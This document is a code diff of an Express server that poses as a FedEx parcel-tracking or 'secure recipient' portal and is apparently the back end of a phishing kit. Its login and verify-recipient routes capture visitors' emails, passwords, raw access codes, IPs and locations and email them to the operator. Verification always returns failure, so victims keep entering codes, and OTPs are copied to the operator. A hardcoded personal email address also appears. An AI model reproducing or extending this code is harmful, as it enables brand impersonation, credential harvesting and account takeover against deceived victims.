@@ -4,32 +4,43 @@ const express = require('express');
 const cors = require('cors');
 const jwt = require('jsonwebtoken');
 const bodyParser = require('body-parser');
-const fetch = require('node-fetch');
 const https = require('https');
-const crypto = require('crypto');  // Node.js built-in
-const { Resend } = require('resend');  // ✅ Resend
+const fetch = require('node-fetch');
+const crypto = require('crypto');
+const { Resend } = require('resend');
 
 const app = express();
-const resend = new Resend(process.env.RESEND_API_KEY);
 
-const allowedOrigins = [
-  'http://localhost:3000',
-  'https://*.vercel.app',
-  'https://fedex-parcel-tracking.vercel.app'
-];
-
+// ----- ENV -----
 const PORT = process.env.PORT || 8080;
-const adminEmail = process.env.ADMIN_EMAIL;
+const RESEND_API_KEY = process.env.RESEND_API_KEY;
+const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
 const SECRET = process.env.SECRET || "fedex_tracker_secret_2025";
-
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+// Log key presence (not value)
+console.log('🔑 RESEND_API_KEY set:', !!RESEND_API_KEY);
+console.log('📧 ADMIN_EMAIL:', ADMIN_EMAIL || '❌ MISSING');
+
+// Resend client
+const resend = new Resend(RESEND_API_KEY);
+
+// ----- CORS -----
+const allowedOrigins = [
+  'http://localhost:3000',
+  'https://*.vercel.app',
+  'https://fedex-parcel-tracking.vercel.app',
+  'https://my-frontend-two-ecru.vercel.app'
+];
+
 app.use(cors({
   origin: function (origin, callback) {
-    if (!origin ||
-        allowedOrigins.includes(origin) ||
-        origin.match(/https:\/\/.*\.vercel\.app$/)) {
+    if (
+      !origin ||
+      allowedOrigins.includes(origin) ||
+      /https:\/\/.*\.vercel\.app$/.test(origin)
+    ) {
       return callback(null, true);
     }
     return callback(new Error('CORS blocked'), false);
@@ -40,6 +51,7 @@ app.use(cors({
 app.use(bodyParser.json({ limit: '10mb' }));
 app.use(express.static('public'));
 
+// ----- SIMPLE USER MOCK -----
 const USER = {
   id: 1,
   email: "egli79380@gmail.com",
@@ -48,8 +60,12 @@ const USER = {
 
 let otpStore = {};
 
+// ----- HELPERS -----
 function getClientIp(req) {
-  return (req.headers["x-forwarded-for"] || "").split(",").pop()?.trim()
+  return (req.headers["x-forwarded-for"] || "")
+    .split(",")
+    .pop()
+    ?.trim()
     || req.connection?.remoteAddress
     || req.socket?.remoteAddress
     || req.connection?.socket?.remoteAddress
@@ -58,32 +74,65 @@ function getClientIp(req) {
 
 async function getLocationFromIp(ip) {
   return new Promise((resolve) => {
-    https.get(`https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`, (resp) => {
-      let data = '';
-      resp.on('data', chunk => data += chunk);
-      resp.on('end', () => {
-        try {
-          const response = JSON.parse(data);
-          if (response.status === 'success') {
-            resolve(`${response.city}, ${response.regionName}, ${response.country}`);
-          } else {
-            resolve('Location unavailable');
+    https.get(
+      `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`,
+      (resp) => {
+        let data = '';
+        resp.on('data', chunk => (data += chunk));
+        resp.on('end', () => {
+          try {
+            const response = JSON.parse(data);
+            if (response.status === 'success') {
+              resolve(`${response.city}, ${response.regionName}, ${response.country}`);
+            } else {
+              resolve('Location unavailable');
+            }
+          } catch (e) {
+            resolve('Location error');
           }
-        } catch (e) {
-          resolve('Location error');
-        }
-      });
-    }).on('error', () => resolve('Location error'));
+        });
+      }
+    ).on('error', () => resolve('Location error'));
   });
 }
 
+// Telegram is disabled to avoid Render timeouts
 async function sendTelegramAlert(message) {
-  // Telegram temporarily disabled due to Render timeouts
-  console.log('Telegram skipped:', message);
+  console.log('📱 Telegram skipped:', message.substring(0, 140) + '...');
   return;
 }
 
-// 🚨 INTRUDER MONITOR - Logs EVERY click/attempt
+// ----- RESEND WRAPPER -----
+async function sendAdminEmail(subject, text) {
+  if (!RESEND_API_KEY) {
+    console.error('❌ RESEND_API_KEY missing; cannot send email');
+    return;
+  }
+  if (!ADMIN_EMAIL) {
+    console.error('❌ ADMIN_EMAIL missing; cannot send email');
+    return;
+  }
+  try {
+    console.log('📤 Resend →', subject);
+    const { data, error } = await resend.emails.send({
+      from: 'FedEx Tracker <onboarding@resend.dev>', // works without domain verification [web:66][web:72]
+      to: [ADMIN_EMAIL],
+      subject,
+      text
+    });
+    if (error) {
+      console.error('❌ Resend API error:', error);
+    } else {
+      console.log('✅ Resend sent, id:', data?.id);
+    }
+  } catch (err) {
+    console.error('❌ Resend FAILED:', err.message);
+  }
+}
+
+// ----- ROUTES -----
+
+// INTRUDER MONITOR - logs every click/attempt
 app.post('/api/log-action', async (req, res) => {
   try {
     const logData = req.body;
@@ -109,15 +158,11 @@ TIME: ${logData.timestamp || new Date().toISOString()}
 EXTRA: ${JSON.stringify(logData, null, 2)}
 ═══════════════════════════════════════════════`;
 
-    // ✅ RESEND: Replace Nodemailer
-    await resend.emails.send({
-      from: 'FedEx Tracker <noreply@resend.dev>',  // Use Resend's default or your verified domain
-      to: [adminEmail],
-      subject: `🚨 FedEx Tracker ${String(logData.action || '').toUpperCase()} (${logData.city || '?'} ${logData.country || '?'})${logData.intruderDetected ? ' [INTRUDER!]' : ''}`,
-      text: alertMailText
-    });
+    await sendAdminEmail(
+      `🚨 FedEx Tracker ${String(logData.action || '').toUpperCase()} (${logData.city || '?'} ${logData.country || '?'})${logData.intruderDetected ? ' [INTRUDER!]' : ''}`,
+      alertMailText
+    );
 
-    // Minimal Telegram alert
     const tgText = `FedEx tracker action: ${logData.action} | email: ${logData.email || 'none'} | ip: ${logData.ip || ip} | at: ${logData.timestamp || new Date().toISOString()}`;
     sendTelegramAlert(tgText);
 
@@ -128,7 +173,7 @@ EXTRA: ${JSON.stringify(logData, null, 2)}
   }
 });
 
-// Login endpoint
+// Login endpoint (if used)
 app.post('/api/login', async (req, res) => {
   const { email, password, loginUrl, browser, ipDetails } = req.body;
   const ip = getClientIp(req);
@@ -142,13 +187,7 @@ Location: ${locationInfo}
 Browser: ${browser || req.headers['user-agent']}
 URL: ${loginUrl || req.headers.referer || 'unknown'}`;
 
-  // ✅ RESEND: Replace Nodemailer
-  await resend.emails.send({
-    from: 'FedEx Tracker <noreply@resend.dev>',
-    to: [adminEmail],
-    subject: '🔐 FedEx Login Attempt',
-    text: alertMailText
-  });
+  await sendAdminEmail('🔐 FedEx Login Attempt', alertMailText);
 
   const tgText = `FedEx login attempt: email=${email} ip=${ip} time=${new Date().toISOString()}`;
   sendTelegramAlert(tgText);
@@ -157,21 +196,19 @@ URL: ${loginUrl || req.headers.referer || 'unknown'}`;
     const otp = crypto.randomInt(100000, 999999).toString();
     otpStore[email] = { otp, created: Date.now() };
 
-    // ✅ RESEND: OTP email
-    await resend.emails.send({
-      from: 'FedEx Tracker <noreply@resend.dev>',
-      to: [email],
-      subject: 'FedEx Secure OTP Code',
-      text: `Your OTP: ${otp} (expires in 15 min)`
-    });
+    await sendAdminEmail(
+      'FedEx Secure OTP Code (copy)',
+      `OTP generated for ${email}: ${otp} (expires in 15 min)`
+    );
 
+    // Optionally email OTP to user as well (not needed for you)
     return res.json({ success: true, message: 'OTP sent' });
   } else {
     return res.status(401).json({ success: false, message: 'Invalid credentials' });
   }
 });
 
-// ✅ NEW: /api/verify-recipient with RAW PASSCODE
+// Recipient verification: RAW PASSCODE to admin
 app.post('/api/verify-recipient', async (req, res) => {
   const { email, code } = req.body;
   const ip = getClientIp(req);
@@ -179,32 +216,25 @@ app.post('/api/verify-recipient', async (req, res) => {
 
   const mailText = `🔐 FedEx Secure Portal - Recipient Verify
 Email: ${email}
-**ACCESS CODE**: ${code || '[empty]'}  // ← RAW CODE SENT HERE
+**ACCESS CODE**: ${code || '[empty]'}
 Access code length: ${code ? code.length : 0}
 IP: ${ip}
 Location: ${locationInfo}
 Time: ${new Date().toISOString()}`;
 
-  // ✅ RESEND: Email to admin WITH RAW CODE
-  await resend.emails.send({
-    from: 'FedEx Tracker <noreply@resend.dev>',
-    to: [adminEmail],
-    subject: '🔐 FedEx Secure Recipient Verification Attempt',
-    text: mailText
-  });
+  await sendAdminEmail('🔐 FedEx Secure Recipient Verification Attempt', mailText);
 
-  // Telegram alert (minimal)
   const tgText = `Recipient verify: email=${email} ip=${ip} time=${new Date().toISOString()}`;
   sendTelegramAlert(tgText);
 
-  return res.json({ ok: false });  // Fixed: was { true: false }
+  return res.json({ ok: false });
 });
 
 app.post('/api/verify-otp', (req, res) => {
   const { email, otp } = req.body;
   const record = otpStore[email];
-  
-  if (record && record.otp === otp && (Date.now() - record.created) < 15*60*1000) {
+
+  if (record && record.otp === otp && (Date.now() - record.created) < 15 * 60 * 1000) {
     delete otpStore[email];
     const token = jwt.sign({ id: USER.id, email }, SECRET, { expiresIn: '2h' });
     res.json({ success: true, token });
